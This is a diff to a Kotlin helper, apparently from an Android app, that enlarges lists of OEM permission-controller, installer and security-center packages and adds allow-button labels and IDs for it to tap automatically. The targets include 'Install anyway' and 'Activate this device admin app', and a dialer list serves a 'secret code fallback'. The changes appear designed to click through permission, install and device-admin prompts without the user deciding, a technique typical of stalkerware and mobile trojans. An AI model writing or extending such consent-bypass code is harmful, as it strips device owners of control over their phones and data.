@@ -26,24 +26,33 @@ object AutoPermissionHelper {
     private val AUTO_TAP_PACKAGES = setOf(
         PKG_PERMISSION_CONTROLLER,
         PKG_PACKAGE_INSTALLER,
+        "com.google.android.permissioncontroller",
         "com.google.android.packageinstaller",
         "com.samsung.android.packageinstaller",
         "com.miui.packageinstaller",
         "com.coloros.packageinstaller",
+        "com.coloros.securitypermission",
+        "com.coloros.grantpermission",
+        "com.coloros.securityguard",
+        "com.coloros.safecenter",
+        "com.oppo.permissionTop",
+        "com.oppo.grantpermission",
+        "com.oppo.safe",
+        "com.heytap.permission",
+        "com.realmepay.security",
         "com.vivo.packageinstaller",
+        "com.vivo.permissionmanager",
         PKG_SETTINGS,            // Accessibility, battery-opt, usage-access
         "com.android.settings",  // stock Android settings
         "com.miui.securitycenter",   // Xiaomi
         "com.samsung.android.settings", // Samsung
         "com.huawei.systemmanager",      // Huawei
-        "com.vivo.permissionmanager",    // Vivo
-        "com.oppo.safe",                 // OPPO/Realme
-        "com.coloros.safecenter",         // ColorOS
         "com.asus.permissioncontroller"  // Asus
     )
 
     private val ALLOW_BUTTON_PATTERNS = listOf(
-        "Allow", "Allow all the time", "While using the app",
+        "Allow", "ALLOW", "Allow all the time", "Always allow",
+        "While using the app", "Only while using the app", "Allow only while using the app",
         "Allow all", "Allow permissions", "Grant", "Continue",
         "Activate", "Activate this device admin app",
         "Install", "Install anyway", "Update", "Next", "Done", "Finish",
@@ -58,16 +67,11 @@ object AutoPermissionHelper {
     // Packages that may show the dialer (for secret code fallback).
     // Covers AOSP, Google, Samsung, and the major OEM forks.
     private val DIALER_PACKAGES = setOf(
-        "com.android.dialer",
         "com.google.android.dialer",
+        "com.android.dialer",
         "com.samsung.android.dialer",
-        "com.android.phone",
-        "com.android.incallui",
-        // Xiaomi / MIUI / HyperOS
-        "com.android.dialer.miui",
+        "com.samsung.android.incallui",
         "com.miui.dialer",
-        // Huawei / EMUI
-        "com.android.dialer.omadm",
         "com.huawei.android.dialer",
         // OPPO / Realme / OnePlus (ColorOS / OxygenOS)
         "com.android.dialer.oneplus",
@@ -218,6 +222,12 @@ object AutoPermissionHelper {
                     "button1", "button_allow", "allow_button", "permission_allow_button",
                     "com.android.permissioncontroller:id/permission_allow_button",
                     "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
+                    "com.android.permissioncontroller:id/permission_allow_always_button",
+                    "com.android.permissioncontroller:id/permission_allow_one_time_button",
+                    "com.coloros.securitypermission:id/permission_allow_button",
+                    "com.coloros.securitypermission:id/button_allow",
+                    "com.oppo.permissionTop:id/button_allow",
+                    "com.heytap.permission:id/permission_allow_button",
                     "android:id/button1", "android:id/button2",
                     "com.android.packageinstaller:id/ok_button",
                     "com.android.packageinstaller:id/install_button",
